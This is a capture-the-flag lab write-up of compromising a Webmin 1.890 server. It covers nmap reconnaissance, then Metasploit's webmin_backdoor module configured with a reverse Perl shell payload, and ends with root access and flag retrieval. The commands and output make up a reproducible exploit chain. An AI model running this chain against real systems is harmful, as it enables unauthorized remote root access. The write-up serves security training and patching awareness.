<h1 align="center">Challenge 050 - Source </h1>
<div align="center">
  <img src="https://github.com/user-attachments/assets/fa803ed8-33ac-443f-a40d-4eb3c6a60b74" width="90" height="90" />
</div>
<br>
<p align="center"> <b>Difficulty</b>: 1/10 (Very Easy) <b>Completed</b>: ✔️ 12.11.2025 </p>

This is a CTF that expects us to exploit a recent vulnerability and hack Webmin, a web-based system configuration tool.

## Reconnaissance

To get an overview we start using nmap again

```
root@ip-10-10-50-214:~# nmap -sV -p- -A 10.10.21.102
Starting Nmap 7.80 ( https://nmap.org ) at 2025-11-12 12:44 GMT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.10.21.102
Host is up (0.00032s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b7:4c:d0:bd:e2:7b:1b:15:72:27:64:56:29:15:ea:23 (RSA)
|   256 b7:85:23:11:4f:44:fa:22:00:8e:40:77:5e:cf:28:7c (ECDSA)
|_  256 a9:fe:4b:82:bf:89:34:59:36:5b:ec:da:c2:d3:95:ce (ED25519)
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
MAC Address: 02:02:91:99:7D:EF (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=11/12%OT=22%CT=1%CU=31978%PV=Y%DS=1%DC=D%G=Y%M=020291%
OS:TM=6914814D%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=109%TI=Z%CI=Z%II=
OS:I%TS=A)OPS(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11
OS:NW7%O5=M2301ST11NW7%O6=M2301ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=
OS:F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%
OS:T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T
OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
OS:0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(
OS:R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.32 ms 10.10.21.102

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.85 seconds
```

I figured we would deal with a web service. That one would be on service on port 10000 though was not on my bingo card. I checked it out.

<img width="1155" height="205" alt="grafik" src="https://github.com/user-attachments/assets/62733bbb-0879-4f1f-88d3-b274b2244ac5" />

We are kindly informed of the fact that the web server is running on in SSL mode. It refers to security settings that dictate how SSL/TLS is used to encrypt data transmitted over a network. It ensures secure connections between clients and servers, protecting data from eavesdropping or tampering during transmission. Let's just click on the link to see what awaits us.

<img width="903" height="569" alt="grafik" src="https://github.com/user-attachments/assets/43e5ff16-c73a-45d1-b595-663dc83ceb6b" />

Looks like we are dealing with a self-signed certificate, which doesn't really speak for a safe security. I looked over it, but couldn't gather any real valuable information as of yet. We may will get back to it. When clicking on the link leading to the website, we are greeted by a login page

<img width="317" height="352" alt="Bildschirmfoto vom 2025-11-12 13-58-04" src="https://github.com/user-attachments/assets/8b2985f4-d0eb-49b7-b5b1-5ce6bbd836e6" />

## Vulnerability Assessment

The challenge itself was talking about exploiting a vulnerability in Webmin, so I figured checking out the version and googling for CVEs that could fit might be a good start. The Webmin service is 1.890

<img width="1108" height="957" alt="Bildschirmfoto vom 2025-11-12 14-24-06" src="https://github.com/user-attachments/assets/72aeccdf-2b5f-4ecc-b665-09bd2bee7856" />

This webmin version seems to allow Remote Code Execution through a backdoor. Metasploit might help us in executing the given code.

## Exploitation

```
msf6 > search webmin backdoor

Matching Modules
================

   #  Name                                     Disclosure Date  Rank       Check  Description
   -  ----                                     ---------------  ----       -----  -----------
   0  exploit/linux/http/webmin_backdoor       2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
   1    \_ target: Automatic (Unix In-Memory)  .                .          .      .
   2    \_ target: Automatic (Linux Dropper)   .                .          .      .


Interact with a module by name or index. For example info 2, use 2 or use exploit/linux/http/webmin_backdoor
After interacting with a module you can manually set a TARGET with set TARGET 'Automatic (Linux Dropper)'
```

Bingo! Now let's set everything up and get the code running

```
msf6 > use exploit/linux/http/webmin_backdoor
[*] Using configured payload cmd/unix/reverse_perl
msf6 exploit(linux/http/webmin_backdoor) > show options

Module options (exploit/linux/http/webmin_backdoor):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:por
                                         t[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.
                                         metasploit.com/docs/using-metasploit/
                                         basics/using-metasploit.html
   RPORT      10000            yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connec
                                         tions
   SSLCert                     no        Path to a custom SSL certificate (def
                                         ault is randomly generated)
   TARGETURI  /                yes       Base path to Webmin
   URIPATH                     no        The URI to use for this exploit (defa
                                         ult is random)
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to
                                       listen on. This must be an address on t
                                       he local machine or 0.0.0.0 to listen o
                                       n all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be s
                                     pecified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Unix In-Memory)



View the full module info with the info, or info -d command.

msf6 exploit(linux/http/webmin_backdoor) > set RHOSTS 10.10.21.102
RHOSTS => 10.10.21.102
msf6 exploit(linux/http/webmin_backdoor) > set LHOST 10.10.50.214
LHOST => 10.10.50.214
msf6 exploit(linux/http/webmin_backdoor) > set ssl true
[!] Changing the SSL option's value may require changing RPORT!
ssl => true
msf6 exploit(linux/http/webmin_backdoor) > run
[*] Started reverse TCP handler on 10.10.50.214:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 1 opened (10.10.50.214:4444 -> 10.10.21.102:40880) at 2025-11-12 13:42:29 +0000
```

And we are in! When checking out who we are, we also can see that we already have root privileges.

```
whoami
root
```

Now we just have to cat the necessary user and root.txt.

```
cat ~/root.txt
THM{XXXXXX_XXXX_XXXXXXX}
```

The other flag was weirdly more challenging to cat. I just settled on using the find command and then directly cat'ing the exact directory

```
find / -name user.txt 2>/dev/null
/home/dark/user.txt
cat /home/dark/user.txt
THM{XXXXXX_XXXXX_XXXXXXXX}
```

## Lesson Learned
In this box, we learned about exploiting vulnerabilities in Webmin to gain unauthorized access. We always need to identify open services, utilizing known exploits (via Metasploit) and consider the version of the service we are dealing with. Frequently update your service or you might fall into a pitfall like here.
